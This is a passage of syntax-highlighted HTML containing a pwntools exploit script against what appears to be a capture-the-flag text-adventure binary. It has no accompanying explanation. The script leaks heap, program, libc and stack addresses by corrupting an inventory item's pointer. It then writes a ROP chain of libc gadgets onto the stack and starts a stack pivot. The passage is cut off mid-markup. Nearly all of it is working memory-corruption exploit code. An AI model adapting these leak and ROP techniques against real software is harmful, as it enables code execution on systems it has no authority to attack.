style="color:#999999">:</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">> </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">shop</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">option: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">12</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">buy : </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">index</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">nums</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#B5695977">''</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">14</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> shop2</span><span style="color:#2993a3">(</span><span style="color:#393A34">index</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">> </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">shop</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">option: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">12</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">buy : </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">index</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#B5695977">''</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">14</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> shop_show</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">> </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">shop</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">option</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">13</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">1 gold)</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">   "</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    heap_leak </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">sh</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#1e754f">(</span><span style="color:#2F798A">6</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">'</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">sell: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">3</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#B5695977">''</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">14</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> heap_leak</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> fight_dragon</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">> </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">search</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">action: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">5</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">item: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">1</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">500000</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">item: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">2</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> inv</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#999999">,</span><span style="color:#393A34"> des</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">> </span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">inv</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">item : </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">4</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">action: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">1</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">name : </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> payload</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">description : </span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    leak </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">sh</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#1e754f">(</span><span style="color:#2F798A">6</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">'</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">New description : </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> des</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> leak</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> calc_heap</span><span style="color:#2993a3">(</span><span style="color:#393A34">addr</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    s </span><span style="color:#999999">=</span><span style="color:#998418"> hex</span><span style="color:#2993a3">(</span><span style="color:#393A34">addr</span><span style="color:#2993a3">)</span><span style="color:#2993a3">[</span><span style="color:#2F798A">2</span><span style="color:#999999">:</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">    s </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#998418">int</span><span style="color:#1e754f">(</span><span style="color:#393A34">x</span><span style="color:#999999">,</span><span style="color:#B07D48"> base</span><span style="color:#999999">=</span><span style="color:#2F798A">16</span><span style="color:#1e754f">)</span><span style="color:#1E754F"> for</span><span style="color:#393A34"> x </span><span style="color:#1E754F">in</span><span style="color:#393A34"> s</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">    res </span><span style="color:#999999">=</span><span style="color:#393A34"> s</span><span style="color:#999999">.</span><span style="color:#393A34">copy</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">9</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        res</span><span style="color:#2993a3">[</span><span style="color:#2F798A">3</span><span style="color:#AB5959">+</span><span style="color:#393A34">i</span><span style="color:#2993a3">]</span><span style="color:#999999"> ^=</span><span style="color:#393A34"> res</span><span style="color:#2993a3">[</span><span style="color:#393A34">i</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">    res </span><span style="color:#999999">=</span><span style="color:#B5695977"> ""</span><span style="color:#999999">.</span><span style="color:#393A34">join</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">x</span><span style="color:#a65e2b">)</span><span style="color:#a65e2b">[</span><span style="color:#2F798A">2</span><span style="color:#999999">:</span><span style="color:#a65e2b">]</span><span style="color:#1E754F"> for</span><span style="color:#393A34"> x </span><span style="color:#1E754F">in</span><span style="color:#393A34"> res</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> res</span><br><br><span style="color:#AB5959">def</span><span style="color:#998418"> map</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    sh</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">> </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">map</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">get_name</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">shop</span><span style="color:#2993a3">(</span><span style="color:#2F798A">4</span><span style="color:#999999">,</span><span style="color:#2F798A"> 8500600</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">move_s</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">move_s</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">move_s</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">move_d</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">fight_dragon</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">heap_leak </span><span style="color:#999999">=</span><span style="color:#393A34"> shop_show</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># leak_info("heap_leak", heap_leak)</span><br><br><span style="color:#393A34">heap_leak </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">calc_heap</span><span style="color:#1e754f">(</span><span style="color:#393A34">heap_leak</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#2F798A"> 16</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">leak_info</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">heap_leak</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> heap_leak</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># debug("b *$rebase(0x1FB13)")</span><br><span style="color:#A0ADA0"># debug("b *$rebase(0x1FB50)")</span><br><br><span style="color:#393A34">shop</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 10</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">shop</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">10</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">a</span><span style="color:#B5695977">'</span><span style="color:#AB5959">*0x</span><span style="color:#2F798A">40</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">heap_leak </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">3f8</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 7</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">des </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">x</span><span style="color:#B5695977">'</span><span style="color:#AB5959">*</span><span style="color:#2F798A">10</span><br><span style="color:#393A34">leak </span><span style="color:#999999">=</span><span style="color:#393A34"> inv</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#999999">,</span><span style="color:#B07D48"> des</span><span style="color:#999999">=</span><span style="color:#393A34">des</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># leak_info("leak", leak)</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">a</span><span style="color:#B5695977">'</span><span style="color:#AB5959">*0x</span><span style="color:#2F798A">40</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">heap_leak </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">440</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">des </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">''</span><br><span style="color:#393A34">code_leak </span><span style="color:#999999">=</span><span style="color:#393A34"> inv</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#999999">,</span><span style="color:#B07D48"> des</span><span style="color:#999999">=</span><span style="color:#393A34">des</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">leak_info</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">code_leak</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> code_leak</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">code_base </span><span style="color:#999999">=</span><span style="color:#393A34"> code_leak </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">367b8</span><br><span style="color:#393A34">leak_info</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">code_base</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> code_base</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">a</span><span style="color:#B5695977">'</span><span style="color:#AB5959">*0x</span><span style="color:#2F798A">40</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">code_base </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">372a8</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">des </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">a</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">libc_leak </span><span style="color:#999999">=</span><span style="color:#393A34"> inv</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#999999">,</span><span style="color:#B07D48"> des</span><span style="color:#999999">=</span><span style="color:#393A34">des</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">leak_info</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">libc_leak</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> libc_leak</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">a</span><span style="color:#B5695977">'</span><span style="color:#AB5959">*0x</span><span style="color:#2F798A">40</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">libc_leak </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">1dd0</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">des </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">a</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">stderr </span><span style="color:#999999">=</span><span style="color:#393A34"> inv</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#999999">,</span><span style="color:#B07D48"> des</span><span style="color:#999999">=</span><span style="color:#393A34">des</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">leak_info</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">stderr</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> stderr</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">address </span><span style="color:#999999">=</span><span style="color:#393A34"> stderr </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">21b6a0</span><br><span style="color:#393A34">leak_info</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">libc.address</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">address</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">a</span><span style="color:#B5695977">'</span><span style="color:#AB5959">*0x</span><span style="color:#2F798A">40</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">heap_leak </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">64e0</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">des </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">a</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">stack_leak </span><span style="color:#999999">=</span><span style="color:#393A34"> inv</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#999999">,</span><span style="color:#B07D48"> des</span><span style="color:#999999">=</span><span style="color:#393A34">des</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">leak_info</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">stack_leak</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> stack_leak</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># debug("b *$rebase(0x2A8E4)")</span><br><span style="color:#A0ADA0"># map()</span><br><br><span style="color:#393A34">pop_rdi </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">2a3e5</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">address</span><br><span style="color:#393A34">pop_rsi </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">1518c2</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">address</span><br><span style="color:#393A34">pop_rdx_2 </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">904a9</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">address</span><br><span style="color:#393A34">pop_rax </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">45eb0</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">address</span><br><span style="color:#393A34">syscall </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">91316</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">address</span><br><span style="color:#393A34">pop_rcx </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">3d1ee</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">address</span><br><span style="color:#393A34">pop_rsp </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">35732</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">address</span><br><span style="color:#393A34">add_rsp_820 </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">149878</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">address</span><br><span style="color:#393A34">xor_eax </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">404f8</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">address</span><br><span style="color:#393A34">xor_edi_syscall </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">d9c4c</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">address</span><br><span style="color:#393A34">xor_edx_eax </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">a8558</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">address</span><br><br><span style="color:#393A34">new_rop </span><span style="color:#999999">=</span><span style="color:#393A34"> stack_leak </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">de0</span><br><br><span style="color:#393A34">rop_chain </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><br><span style="color:#393A34">    xor_eax</span><span style="color:#999999">,</span><br><span style="color:#393A34">    pop_rsi</span><span style="color:#999999">,</span><br><span style="color:#393A34">    stack_leak</span><span style="color:#AB5959">-0x</span><span style="color:#2F798A">da8</span><span style="color:#AB5959">+</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><br><span style="color:#393A34">    xor_edx_eax</span><span style="color:#999999">,</span><br><span style="color:#393A34">    pop_rdx_2</span><span style="color:#999999">,</span><br><span style="color:#AB5959">    0x</span><span style="color:#2F798A">1011</span><span style="color:#999999">,</span><br><span style="color:#AB5959">    0x</span><span style="color:#2F798A">1011</span><span style="color:#999999">,</span><br><span style="color:#393A34">    xor_edi_syscall</span><br><span style="color:#2993a3">]</span><br><br><span style="color:#1E754F">for</span><span style="color:#393A34"> i</span><span style="color:#999999">,</span><span style="color:#393A34"> gadget </span><span style="color:#1E754F">in</span><span style="color:#998418"> enumerate</span><span style="color:#2993a3">(</span><span style="color:#393A34">rop_chain</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">a</span><span style="color:#B5695977">'</span><span style="color:#AB5959">*0x</span><span style="color:#2F798A">40</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">new_rop </span><span style="color:#AB5959">+</span><span style="color:#393A34"> i</span><span style="color:#AB5959">*</span><span style="color:#2F798A">8</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    des </span><span style="color:#999999">=</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">gadget</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    inv</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#999999">,</span><span style="color:#B07D48"> des</span><span style="color:#999999">=</span><span style="color:#393A34">des</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">rop_start </span><span style="color:#999999">=</span><span style="color:#393A34"> stack_leak </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">1620</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">a</span><span style="color:#B5695977">'</span><span style="color:#AB5959">*0x</span><span style="color:#2F798A">40</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">rop_start</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">des </span><span style="color:#999999">=</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">add_rsp_820</span><span 